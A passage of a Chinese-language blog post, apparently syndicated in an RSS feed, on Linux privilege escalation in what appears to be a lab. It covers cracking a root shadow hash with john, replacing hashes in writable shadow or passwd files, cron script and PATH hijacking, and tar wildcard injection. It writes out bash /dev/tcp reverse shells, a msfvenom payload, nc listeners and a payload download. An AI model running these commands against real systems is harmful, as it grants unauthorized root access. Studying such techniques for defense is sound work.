+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;登录名:加密口令:最后一次修改时间:最小时间间隔:最大时间间隔:警告时间:不活动时间:失效时间:标志&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;root:&lt;span class=&#34;token variable&#34;&gt;$6&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$mqjgcFoM&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$X&lt;/span&gt;/qNpZR6gXPAxdgDjFpaD1yPIqUF5l5ZDANRTKyvcHQwSqSxX5lA7n22kjEkQhSP6Uq7cPaYfzPSmgATM9cwD1:18050:0:99999:7:::&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;利用条件 shadow 有权查看&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240221213805632.png&#34; alt=&#34;image-20240221213805632&#34;&gt;&lt;/p&gt;
+&lt;p&gt;获取 root 用户信息并保存在新建文件中&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240221213918116.png&#34; alt=&#34;image-20240221213918116&#34;&gt;&lt;/p&gt;
+&lt;p&gt;root:&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mn&gt;6&lt;/mn&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;6&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.6444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;mqjgcFoM$X/qNpZR6gXPAxdgDjFpaD1yPIqUF5l5ZDANRTKyvcHQwSqSxX5lA7n22kjEkQhSP6Uq7cPaYfzPSmgATM9cwD1:18050:0:99999:7:::&lt;/p&gt;
+&lt;p&gt;利用工具 john 来破解&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240221220225042.png&#34; alt=&#34;image-20240221220225042&#34;&gt;&lt;/p&gt;
+&lt;p&gt;得到明文密码就可以切换 root 了&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240221220330572.png&#34; alt=&#34;image-20240221220330572&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;可写shadow文件利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#可写shadow文件利用&#34;&gt;#&lt;/a&gt; 可写 shadow 文件利用&lt;/h4&gt;
+&lt;p&gt;利用原理：把 shadow 文件里 root 用户 hash 值替换为自己生成的就可以 hash 再用生成用到的明文进行登录 root&lt;/p&gt;
+&lt;p&gt;前提要有 shadow 可写权限&lt;/p&gt;
+&lt;p&gt;通过 mkpasswd 生成哈希&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;mkpasswd -m sha-512 1234567&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;$6$hpRA5YNV9lAANtsF$JwX/K8VfxhxpTm5U2oTEgFw.YiYVCmfzZ0i6SqUDkpJRamWVmQ0LgflQUlhjVHkAS5N8MwFFR12mHBg6qFhwC/&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240221221309745.png&#34; alt=&#34;image-20240221221309745&#34;&gt;&lt;/p&gt;
+&lt;p&gt;用 sha-521 是因为&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$6&lt;/span&gt;$开头的，表明是用SHA-512加密的，密文长度86&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token variable&#34;&gt;$1&lt;/span&gt;$ 表明是用MD5加密的，密文长度22个字符&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token variable&#34;&gt;$2&lt;/span&gt;$ 是用Blowfish加密的，&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token variable&#34;&gt;$5&lt;/span&gt;$ 是用 SHA-256加密的，密文长度43&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;接着把生成的 hash 替换原本的就可以用 1234567 登陆了&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240221221617115.png&#34; alt=&#34;image-20240221221617115&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;可写passwd文件利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#可写passwd文件利用&#34;&gt;#&lt;/a&gt; 可写 passwd 文件利用&lt;/h4&gt;
+&lt;p&gt;虽然 passwd 文件里 hash 被 X 替代了无法查看但是把 X 替换为我们生成的 hash 还是可以登陆的&lt;/p&gt;
+&lt;p&gt;利用 openssl 生成&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;openssl passwd 987654321&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;$1$uOZ/Tr4f$EqDyR9WU8wJNeB3tEY09f.&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;把 passwd 里 root 的 X 替换&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240221222616639.png&#34; alt=&#34;image-20240221222616639&#34;&gt;&lt;/p&gt;
+&lt;p&gt;即可用 987654321 切换 root&lt;/p&gt;
+&lt;h4 id=&#34;计划任务提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#计划任务提权&#34;&gt;#&lt;/a&gt; 计划任务提权&lt;/h4&gt;
+&lt;p&gt;查看计划任务&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240222000243892.png&#34; alt=&#34;image-20240222000243892&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;* * * * * root    /home/crontab.sh&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;这条计划任务的意思是每 1 分钟执行一次 crontab.sh 脚本，并且是以 root 用户的权限来执行。&lt;/p&gt;
+&lt;p&gt;而这个文件我们是有权更改的那么就可以写入反弹 shell 命令&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;echo &#39;bash -c &amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.139/4444 0&amp;gt;&amp;amp;1&amp;quot;&#39; &amp;gt; crontab.sh&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;nc 进行监听等一分钟拿 shell&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240222003928818.png&#34; alt=&#34;image-20240222003928818&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240222005508201.png&#34; alt=&#34;image-20240222005508201&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;计划任务环境变量提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#计划任务环境变量提权&#34;&gt;#&lt;/a&gt; 计划任务环境变量提权&lt;/h4&gt;
+&lt;p&gt;如果你在计划任务中没有指定程序的绝对路径，系统会在 crontab 文件中的 &lt;code&gt;PATH&lt;/code&gt;  环境变量所列出的目录中查找该程序。这些目录会按照在 &lt;code&gt;PATH&lt;/code&gt;  变量中的顺序被检查。如果在某个目录中找到了该程序，系统就会停止搜索并执行该程序。&lt;/p&gt;
+&lt;p&gt;图中每分钟执行一次 &lt;code&gt;shell.sh&lt;/code&gt;  脚本但是没有指定绝对路径， &lt;code&gt;PATH&lt;/code&gt;  中默认优先查找 /home/yunyi 路径下有没有 shell.sh 有的话&lt;/p&gt;
+&lt;p&gt;就每分钟执行，利用这个特性就可以在 &lt;code&gt;yunyi&lt;/code&gt;  目录中创建一个 &lt;code&gt;shell.sh&lt;/code&gt;  并写上反弹 shell 进行提权&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240223220655325.png&#34; alt=&#34;image-20240223220655325&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;#!/bin/bash&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;bash -c &amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.142/7676 0&amp;gt;&amp;amp;1&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240223220835815.png&#34; alt=&#34;image-20240223220835815&#34;&gt;&lt;/p&gt;
+&lt;p&gt;别忘了给执行权限 &lt;code&gt;chmod +x shell.sh&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;kali：nc -vlnp 7676&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;获取 shell&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240223221033086.png&#34; alt=&#34;image-20240223221033086&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;计划任务统配符提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#计划任务统配符提权&#34;&gt;#&lt;/a&gt; 计划任务统配符提权&lt;/h4&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240223220655325.png&#34; alt=&#34;image-20240223220655325&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里还有一个 zip.sh 看一下内容是&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240223221316077.png&#34; alt=&#34;image-20240223221316077&#34;&gt;&lt;/p&gt;
+&lt;p&gt;到 home/yunyi/user 目录下打包所有文件夹文件到 /tmp 目录下名为 yunyi.tar.gz&lt;/p&gt;
+&lt;p&gt;利用 tar &lt;code&gt;命令的&lt;/code&gt; –checkpoint &lt;code&gt;和&lt;/code&gt; –checkpoint-action&lt;/p&gt;
+&lt;p&gt;tar &lt;code&gt;命令的&lt;/code&gt; –checkpoint &lt;code&gt;和&lt;/code&gt; –checkpoint-action &lt;code&gt;参数可以被用来执行提权操作这是因为&lt;/code&gt;  tar` 命令在处理文件时，可以在每个检查点 checkpoint 执行一个特定的动作 action&lt;/p&gt;
+&lt;p&gt;如果管理员给予了某个普通用户 &lt;code&gt;tar&lt;/code&gt;  命令的超级管理员操作权限，那么我们可以使用 &lt;code&gt;tar&lt;/code&gt;  命令进行提权例如，以下命令可以创建一个新的归档文件，并在每个检查点执行 &lt;code&gt;/bin/bash&lt;/code&gt;  命令&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sudo -u root tar cf /dev/null exploit --checkpoint=1 --checkpoint-action=exec=&amp;quot;/bin/bash&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;在这个命令中， &lt;code&gt;--checkpoint=1&lt;/code&gt;  表示每处理一个文件就设置一个检查点， &lt;code&gt;--checkpoint-action=exec=&amp;quot;/bin/bash&amp;quot;&lt;/code&gt;  表示在每个检查点执行 &lt;code&gt;/bin/bash&lt;/code&gt;  命令因为 &lt;code&gt;tar&lt;/code&gt;  命令是以 &lt;code&gt;root&lt;/code&gt;  用户的身份运行的，所以 &lt;code&gt;/bin/bash&lt;/code&gt;  命令也会以 &lt;code&gt;root&lt;/code&gt;  用户的身份运行，从而获得 &lt;code&gt;root&lt;/code&gt;  权限&lt;/p&gt;
+&lt;p&gt;kali 生成反弹 shell 文件&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.142 LPORT=8989 -f elf -o shell.elf&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;启动一个 http 服务受害机下载 shell 文件并给予权限&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240224132512587.png&#34; alt=&#34;image-20240224132512587&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240224132558854.png&#34; alt=&#34;image-20240224132558854&#34;&gt;&lt;/p&gt;
+&lt;p&gt;在 user 目录创建这两个文件&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;touch /home/yunyi/user/--checkpoint-action=exec=shell.elf&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;touch /home/yunyi/user/--checkpoint=1&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240224133036613.png&#34; alt=&#34;image-20240224133036613&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240224140015673.png&#34; alt=&#34;image-20240224140015673&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;nc -lvnp 8989&lt;/code&gt;  拿到权限&lt;/p&gt;
+&lt;p&gt;也可以创建一个 sh 脚本反弹 shell&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;touch /home/yunyi/user/--checkpoint-action=exec=sh shell.sh&lt;/code&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
         <item>
             <guid isPermalink="true">http://gyzero.shop/2023/11/09/network-security/neiwang/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/</guid>
             <title>Windows提权</title>
